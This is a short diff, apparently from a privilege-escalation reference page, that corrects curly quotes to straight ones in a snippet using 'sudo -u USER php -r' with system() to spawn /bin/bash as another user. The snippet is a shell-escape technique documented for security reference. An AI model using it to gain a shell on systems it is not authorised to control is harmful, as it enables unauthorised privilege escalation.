@@ -27,5 +27,5 @@ bash -p
 ```bash
 CMD=”/bin/bash”
 
-sudo -u USER php -r “system(’$CMD’);”
+sudo -u USER php -r “system('$CMD');”
 ```
